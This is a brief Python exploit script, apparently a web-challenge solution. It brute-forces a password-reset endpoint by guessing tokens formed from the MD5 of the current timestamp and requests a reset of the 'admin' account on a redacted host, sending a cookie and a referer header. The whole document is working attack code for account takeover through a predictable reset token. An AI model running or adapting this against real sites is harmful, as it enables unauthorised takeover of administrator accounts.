#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2017/03/09
# Created by FireEgret

import time
from urllib import request, parse
import hashlib
# print(time.time())


while 1:
    key = hashlib.new('md5', str(int(time.time())).encode('utf-8')).hexdigest()

# post_data = parse.urlencode([
#     ('sukey', key),
#     ('username', 'admin')
# ])
    url = "xxxx/reset.php?sukey="+key+"&username=admin"

    req = request.Request(url)
    req.add_header("Cookie", "xxxxx")
    req.add_header('Referer', 'xxxxxxxx/resetpassword.php')
    with request.urlopen(req) as f:
        time.sleep(0.5)
        data = f.read()
        if data:
            print(data.decode('utf-8'))
            break
        else:
            print(key)
